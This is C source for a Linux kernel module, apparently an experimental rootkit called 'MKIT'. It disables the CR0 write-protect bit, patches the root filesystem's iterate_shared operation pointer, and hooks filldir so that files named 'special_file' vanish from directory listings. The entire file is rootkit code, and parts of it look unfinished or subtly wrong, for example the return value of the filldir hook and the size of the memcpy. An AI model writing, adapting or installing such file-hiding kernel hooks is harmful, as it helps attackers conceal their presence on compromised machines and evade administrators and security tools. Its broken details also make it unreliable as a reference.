#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/file.h>

MODULE_LICENSE("GPL");

#define HIDE_FILE_NAME "special_file"

// This is the function type in type struct file_operations 
typedef int (*iterate_shared_t)(struct file*, struct dir_context*);
// This is the function type for the actual reading of a directory
typedef int (*readdir_t)(struct file *, void *, filldir_t);

// Globals 
readdir_t orig_root_readdir = NULL, orig_opt_readdir = NULL;
iterate_shared_t g_original_iterate = NULL;
iterate_shared_t g_hooked_iterate = NULL;
filldir_t original_root_filldir = NULL;

// Prototypes
int mkit_hooked_iterate(struct file* fp, struct dir_context* ctx);
int patch_operation(const char* name, iterate_shared_t hooked_iterate, iterate_shared_t* original_iterate);
int undo_patch(const char* name, iterate_shared_t original_iterate);
bool hooked_filldir(struct dir_context* dir_ctx, const char* name, int name_len, loff_t offset, u64 ino, unsigned d_type);
uint64_t clear_return_cr0(void);
void setback_cr0(uint64_t val);

uint64_t g_cr0_val;	
uint64_t clear_return_cr0(void) {
	uint64_t cr0 = 0;
	uint64_t ret;
	asm volatile ("mov %%cr0, %%rax"
	:"=a"(cr0)
	);
	ret = cr0;
	cr0 &= 0xfffeffff;
	asm volatile ("mov %%rax, %%cr0"
	:
	:"a"(cr0)
	);
	return ret;
}
void setback_cr0(uint64_t val) {
	asm volatile ("mov %%rax, %%cr0"
	:
	:"a"(val)
	);
}


// Look at fs/readdir.c "filldir" function
bool hooked_filldir(struct dir_context* dir_ctx, const char* name, int name_len, loff_t offset, u64 ino, unsigned d_type) {

	#ifdef DEBUG
	printk(KERN_INFO "[DEBUG] File name: %s", name);
	#endif

	if (!strcmp(name, HIDE_FILE_NAME)) {
		#ifdef DEBUG
		printk(KERN_ALERT "[DEBUG] FOUND SPECIAL FILE !\n");
		#endif
		return ENOENT;// This prevents the file from being seen?
	}

	return original_root_filldir(dir_ctx, name, name_len, offset, ino, d_type);
}

int mkit_hooked_iterate(struct file* fp, struct dir_context* ctx) {

	int result = 0;

	#ifdef DEBUG
	printk(KERN_INFO "[DEBUG] Looking in directory: %s\n", fp->f_path.dentry->d_name.name);
	#endif

	// This prevents listing files in that directory, but the directory is still visible
	/*
	if (!strcmp(fp->f_path.dentry->d_name.name, "special_directory")) {
		return -ENOTDIR;
	} 
	*/
	
	if (!fp || !fp->f_path.dentry  || !g_original_iterate)
	{
		return -ENOTDIR;
	}
	
	original_root_filldir = ctx->actor;


	struct dir_context new_ctx = {
		.actor = hooked_filldir
	};
	
	memcpy(ctx, &new_ctx, sizeof(readdir_t));
	result = g_original_iterate(fp, ctx);
	
	return result;
}

int patch_operation(const char* name, iterate_shared_t hooked_iterate, iterate_shared_t* original_iterate) {

	struct file* the_file; 

	// It doesn't really matter what file we open because we are after a operations pointer
	the_file = filp_open(name, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(the_file)) {
        return -1;
	}

	#ifdef DEBUG
    printk(KERN_INFO "[DEBUG] original iterate: %p\n", the_file->f_op->iterate_shared);
	printk(KERN_INFO "[DEBUG] hooked iterate: %p\n", (void*)hooked_iterate);
	#endif

    *original_iterate = the_file->f_op->iterate_shared;
    memmove((void*)&the_file->f_op->iterate_shared, &hooked_iterate, 8);
	#ifdef DEBUG
	printk(KERN_INFO "[DEBUG] original iterate (AFTER): %p\n", the_file->f_op->iterate_shared);
	printk(KERN_INFO "[DEBUG] g_original_iterate => %p\n", (void*)g_original_iterate);
	#endif
    /*
        Trying to do: 
        the_file->f_op->iterate_shared = hooked_iterate;
        results in: 
        error: assignment of member ‘iterate_shared’ in read-only object
    */
    return 0;
}

int undo_patch(const char* name, iterate_shared_t original_iterate) {

	struct file* the_file; 

	the_file = filp_open(name, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(the_file)) {
        return -1;
	}
	memmove((void*)&the_file->f_op->iterate_shared, &original_iterate, 8);

	return 0;
}


static int __init mkit_init(void) {
		g_cr0_val = clear_return_cr0();
        patch_operation("/", &mkit_hooked_iterate, &g_original_iterate);
		setback_cr0(g_cr0_val);
		printk(KERN_ALERT "MKIT: Patch installed\n");

        return 0;
}

static void __exit mkit_exit(void) {
	g_cr0_val = clear_return_cr0();
    undo_patch("/", g_original_iterate);
	setback_cr0(g_cr0_val);
	printk(KERN_ALERT "MKIT: Patch removed. Module unloading...\n");
}

module_init(mkit_init);
module_exit(mkit_exit);